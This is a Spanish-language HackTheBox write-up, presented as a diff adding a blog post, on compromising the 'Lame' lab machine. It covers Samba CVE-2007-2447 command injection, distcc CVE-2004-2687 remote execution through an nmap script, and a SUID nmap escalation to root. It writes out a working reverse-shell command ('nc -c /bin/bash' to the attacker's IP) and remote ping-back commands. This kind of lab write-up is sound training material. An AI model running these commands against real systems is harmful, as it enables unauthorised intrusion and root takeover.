@@ -1,0 +1,177 @@
+---
+title: "Lame"
+date: 2025-05-29 16:41:33 +0200
+categories: writeups HackTheBox
+tags: máquina linux cve smb nmap suid commandinjection rce
+description: Writeup de la máquina Lame de Hackthebox.
+image: ../assets/images/posts/logos/hackthebox.png
+---_
+## Resumen de la resolución
+
+**Lame** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**. En el ella veremos dos diferentes formas de ganar acceso a la máquina víctima, una de ellas es a través del una versión vulnerable de **Samba** (**3.0.20**) con el siguiente **CVE-2007-2447**. La segunda y última forma es del puerto **3632** donde está alojado el servicio **distccd** el cual es vulnerable al **CVE-2004-2687**. En caso de haber optado por la primera opción ya ganaremos acceso a la máquina víctima como **root**, en cambio si elegimos la segunda forma debemos de realizar una escalada de privilegios. Para realizar la escalada de privilegios, abusaremos del permiso **SUID** asignado sobre el binario de `nmap`, básicamente debemos de entrar en el modo interactivo de `nmap` para posteriormente ejecutarnos una **sh** (`!sh`) y como el propietario del binario es **root** obtendremos una **sh** como dicho usuario. Es importante destacar que la versión del kernel es bastante antigua por lo que seguramente sea vulnerable.
+
+---
+## Enumeración
+
+En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:
+
+```bash
+openvpn lab_trr0r.opvn
+```
+
+Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209214454.png>)
+
+> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.3`.
+### Nmap
+
+En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.
+
+```bash
+nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.10.3 -oG allPorts
+```
+
+Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22, 21, 445, 139 y 3632**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209214719.png>)
+
+Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.
+
+A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.
+
+```bash
+nmap -p21,22,139,445,3632 -sCV 10.10.10.3 -oN targeted
+```
+
+En el segundo escaneo de **Nmap** lo que más nos llamará es la versión del servicio **FTP** y la habilitación del **Anonymous Login** a través de **FTP**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209214826.png>)
+
+---
+### Puerto 21 - FTP (vsftpd)
+
+Como bien habíamos visto en el escaneo de **Nmap** está permitido el **Anonymous Login**. Al probarlo conseguiremos acceder correctamente pero no hay ningún recurso compartido.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209215204.png>)
+
+Buscando en **searchsploit** veremos que la versión de **FTP** es vulnerable a una **ejecución de Comandos** debido a un **Backdoor**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209215031.png>)
+
+Mirando el código fuente del exploit veremos que el **Backdoor** se basa en poner una `:)` en el campo **USER** , y automáticamente se abrirá el puerto **6200** a través del cual podemos ejecutar comandos.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209221636.png>)
+
+Nos conectaremos al puerto **21** (**FTP**) usando **NetCat** e intentaremos acontecer el **Backdoor** como hemos visto previamente.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209215622.png>)
+
+Nos intentamos conectar al puerto **6200** pero veremos que no se encuentra abierto por lo que el **Backdoor** no aplica para esta máquina.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209221602.png>)
+
+---
+### Puerto 139,443 - SMB (Samba)
+
+Una vez enumerado el **FTP** y tras comprobar que no se acontece el **Backdoor** comenzaremos a **Enumerar el servicio SMB**, para ello ejecutaremos el siguiente comando usando **smbmap**.
+
+```bash
+smbmap -H 10.10.10.3
+```
+
+Veremos que existe un recurso compartido (**/tmp**) sobre el que tenemos capacidad de lectura y escritura.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209222110.png>)
+
+Nos conectaremos usando **smbclient** al recurso **/tmp** y veremos que es la carpeta **/tmp** de la máquina víctima.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209222024.png>)
+
+---
+## Explotación
+
+### CVE-2007-2447 | Command Injection → RCE \[Way 1]
+
+Accediendo al recurso compartido **/tmp** no podemos hacer nada interesante usaremos **searchsploit** y veremos que la versión de **Samba** (**3.0.20**) es vulnerable a una ejecución de comandos.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209221740.png>)
+
+Aunque el exploit es para **Metasploit** podemos ver su código fuente para ver como se llega a la **ejecución de comandos**. Básicamente se basa en una **inyección de comandos** gracias al uso del siguiente payload.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209221911.png>)
+
+Usando el parámetro `-U` de **smbclient** colaremos el comando en el campo del usuario y tras previamente habernos puesto en escucha por paquetes **ICMP**, veremos como recibimos el paquete **ICMP** por lo que hemos logrado **ejecutar comandos remontante** gracias a una **inyección de comandos**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209222434.png>)
+
+En este punto nos pondremos en escucha con **NetCat** (`nc -nvlp 443`), nos enviaremos un comando (`whoami`) y veremos que estamos ejecutando comandos remotamente como **root**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209222559.png>)
+
+En este punto lo que haremos sería enviarnos una **Reverse Shell**. Una vez recibida veremos que hemos ganado acceso a la máquina víctima como **root**, finalmente realizaremos un **Tratamiento de la TTY** para poder operar desde una terminal más cómoda.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209223026.png>)
+### CVE-2004-2687 | RCE \[Way 2]
+
+Contamos con otra forma de ganar acceso a la máquina víctima y es a través del puerto **3632**. Buscando en internet nos encontraremos con el siguiente artículo, **Port 3632 - Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/3632-pentesting-distcc.html) en el cual veremos que como abusar de dicho puerto (**3632**) para ejecutar comandos gracias a [Nmap**.
+
+```bash
+nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
+```
+
+Al finalizar el escaneo de **Nmap** veremos como nos reporta que dicho puerto es vulnerable (**CVE-2004-2687**).
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209223753.png>)
+#### Manual
+
+Usaremos el mismo comando de **Nmap** para ejecutar comandos remotamente, en este caso nos enviaremos un **ping** a nuestra máquina de atacante.
+
+```bash
+nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='ping -c 1 10.10.14.6'"
+```
+
+Tras previamente habernos puesto en escucha de paquetes **ICMP** veremos como recibimos un **ping** de la máquina víctima.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209234441.png>)
+
+En el caso de que intentemos enviarnos una **Reverse Shell** usando el anterior comando de **Nmap** no vamos a poder, por lo que alternativamente podemos usar la siguiente instrucción de **Nmap**.
+
+```bash
+nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -c /bin/bash 10.10.14.6 443'"
+```
+
+Tal y como se aprecia abajo conseguimos recibir la **Reverse Shell**, por lo que habremos ganado acceso a la máquina víctima como el usuario **daemon**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209234544.png>)
+#### Automated
+
+En segundo y último lugar, veremos una alternativa para ganar acceso a la máquina víctima, buscando en internet por el **CVE** daremos con el siguiente repositorio [distcc exploit - Github](https://github.com/angelpimentell/distcc_cve_2004-2687_exploit) a través del cual conseguimos una shell como **daemon** en la máquina víctima.
+
+> Destacar que esta consola no es totalmente interactiva por lo que vamos a tener problemas para elevar nuestros privilegios.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209224046.png>)
+
+---
+## Escalada de privilegios
+### Enumeración local
+
+Una vez hayamos ganado acceso a la máquina víctima realizaremos un **Tratamiento de la TTY** para poder operar desde una terminal más cómoda.
+
+Comenzaremos con la enumeración básica del sistema. En primer lugar, veremos que no tenemos asignado ningún permiso de **Sudoers**, pero en cambio contamos con el permiso **SUID** sobre el binario **/usr/bin/nmap**.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209234635.png>)
+
+>[!INFO]
+> Otra alternativa de elevar nuestros privilegios podría ser a través de una vulnerabilidad en el kernel, pues este cuenta con una versión muy antigua.
+### /usr/bin/nmap | SUID
+
+Buscando en **GTFOBins - Nmap](https://gtfobins.github.io/gtfobins/nmap/#sudo) veremos como podemos elevar nuestros privilegios gracias al permiso [SUID** asignado sobre **Nmap**.
+
+Básicamente debemos de entrar en el modo interactivo con el que antiguamente contaba **Nmap** (`nmap --interactive`), y una vez dentro de él colaremos un comando (`!sh`) para escapar del modo interactivo y que nos lance una shell como el usuario propietario (**root**).
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209234825.png>)
+
+Realizaremos lo mismo que antes, pero en vez de lanzar una **sh** (`!sh`) lanzaremos una **bash** (`!bash`), pero por algún motivo el cual desconozco no nos la lanzará.
+
+![](<../assets/images/posts/2025-05-29-lame/Pasted image 20250209234838.png>)
